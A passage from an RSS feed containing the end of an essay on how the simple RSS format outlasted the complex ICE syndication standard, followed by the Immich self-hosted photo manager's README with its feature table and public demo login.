aggregator at my.userland.com. There wasn’t a whiff of server racks or five-figure investments. In fact, there wasn’t even anyone at the helm, as Netscape had abandoned development.“Now, let the flames begin…repeated attempts to find anyone who cares about RSS at Netscape have turned up nothing,” Dave Winer ranted on his blog in the summer of 2000. “The people we worked with at Netscape left shortly after [version] 0.91 was finalized.” That would have immediately killed the consortium-driven ICE standard. Not so for RSS’s grassroots efforts. Winer simply wrote his own version.“Up until this morning I wasn't sure if this document should be called 0.91 or 0.92. I was concerned that practice had deviated from the Netscape spec, esp in respecting the limits it imposes, which most developers (myself included) think are ridiculous and unweblike…so I changed the title from 0.92 to 0.91. So all this is a cleanup. All the Netscapeisms are removed.” What started as a passion project by a disgruntled individual grew into a movement. And those in the ICE camp knew it. Laird Popkin went as far as writing a post about how to map RSS into ICE syntax, pointing out that “The widespread adoption of RSS by low-end syndicators to distribute promotional links should serve as a clear indicator of the importance of this scenario in the world of syndication.” Complicated vs UncomplicatedBut there was simply no getting around how bloated ICE’s requirements were. Its North Star was automating complex, corporate publishing partnerships. It contained fields for catalog pricing and negotiation, content expiration tags, copyright enforcement functions, and the ability to apply the display website’s visual branding to feed content. While most of them could be ignored, that didn’t make its 58,000-word Getting-Started guide any more digestible.A web-based aggregator in 1999 via Release 1.0Werbach predicted in The Web Goes Into Syndication that, because ICE was overkill for most uses, “Should this become a head-to-head competition, though, the moral of the Internet’s story is that simple, open-source protocols that scale up tend to win over complex top-down approaches.”Almost anyone could set up an RSS feed or an RSS aggregator. When Winer released RSS version 2.0 in 2002, a feed could be considered compliant with only three elements: feed title, feed description, and a link to the items you wanted to share. “I definitely want ICE-like stuff in RSS2, publish and subscribe is at the top of my list, but I am going to fight tooth and nail for simplicity.” Winer argued in one of the many combative and public RSS mailing lists.Never mind that the RSS group couldn’t even agree on what the acronym stood for, they were trouncing ICE. The New York Times, a publisher that should have been firmly in ICE’s wheelhouse, adopted RSS in November 2002. ICE limped on, however, with the authoring group releasing version 2.0 in 2004. But less than a year later, Microsoft, arguably ICE’s biggest cheerleader, had a dedicated RSS blog. Its first post proposed icon designs for Internet Explorer’s built-in RSS features. It wasn’t an explicit capitulation. ICE and RSS could have theoretically co-existed. Just like Betamax could have let other companies manufacture and sell Betamax players. But they didn’t. So they lost.When small wins are better than big ones In their timeline of The Rise and Demise of RSS, Sinclair Target sees the glass half empty, believing that in another timeline the standard could have been more widely adopted if not for the fights between developers. “RSS, an open format, didn’t give technology companies the control over data and eyeballs that they needed to sell ads, so they did not support it. But the more mundane reason is that centralized silos are just easier to design than common standards.” And yet, no one has heard of ICE. I couldn’t even find proof of any publishers who used it to ink syndication deals. RSS, meanwhile, lives on. RSS-to-email is one of Buttondown’s most popular features!"I can't really explain it, I would have thought given all the abuse it's taken over the years that it would be stumbling a lot worse," Winer told Wired in 2015, as opinions on algorithmic social media began to sour.All RSS had to do to weather ICE, Twitter, AI, and whatever comes next, was keep things simple and let users build their own feeds, filters, lists, and aggregators. Like email, it probably won’t make anyone a billion dollars or reshape entire industries. But it will always be wholly yours. And if that isn’t nice I don’t know what is.Header image via Bloglines.softonic.com]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Immich – High performance self-hosted photo and video management solution]]></title>
            <link>https://github.com/immich-app/immich</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45165684</guid>
            <description><![CDATA[High performance self-hosted photo and video management solution. - immich-app/immich]]></description>
            <content:encoded><![CDATA[ 
  
  
  
    
  



High performance self-hosted photo and video management solution






  Català
  Español
  Français
  Italiano
  日本語
  한국어
  Deutsch
  Nederlands
  Türkçe
  中文
  Українська
  Русский
  Português Brasileiro
  Svenska
  العربية
  Tiếng Việt
  ภาษาไทย

Disclaimer

⚠️ The project is under very active development.
⚠️ Expect bugs and breaking changes.
⚠️ Do not use the app as the only way to store your photos and videos.
⚠️ Always follow 3-2-1 backup plan for your precious photos and videos!

NoteYou can find the main documentation, including installation guides, at https://immich.app/.

Links

Documentation
About
Installation
Roadmap
Demo
Features
Translations
Contributing

Demo
Access the demo here. For the mobile app, you can use https://demo.immich.app for the Server Endpoint URL.
Login credentials



Email
Password




demo@immich.app
demo



Features



Features
Mobile
Web




Upload and view videos and photos
Yes
Yes


Auto backup when the app is opened
Yes
N/A


Prevent duplication of assets
Yes
Yes


Selective album(s) for backup
Yes
N/A


Download photos and videos to local device
Yes
Yes


Multi-user support
Yes
Yes


Album and Shared albums
Yes
Yes


Scrubbable/draggable scrollbar
Yes
Yes


Support raw formats
Yes
Yes


Metadata view (EXIF, map)
Yes
Yes


Search by metadata, objects, faces, and CLIP
Yes
Yes


Administrative functions (user management)
No
Yes


Background backup
Yes
N/A


Virtual scroll
Yes
Yes


OAuth support
Yes
Yes


API Keys
N/A
Yes


LivePhoto/MotionPhoto backup and playback
Yes
Yes


Support 360 degree image display
No
Yes


User-defined storage structure
Yes
Yes


Public Sharing
Yes
Yes


Archive and Favorites
Yes
Yes


Global Map
Yes
Yes


Partner Sharing
Yes
Yes


Facial recognition and clustering
Yes
Yes


Memories (x years ago)
Yes
Yes


Offline support
Yes
No


Read-only gallery
Yes
Yes


Stacked Photos
Yes
Yes


Tags
No
Yes


Folder View
Yes
Yes



Translations
Read more about translations here.



Repository activity

Star history

 
   
   
   
 

Contributors

  

]]></content:encoded>
        </item>
    </channel>
</rss>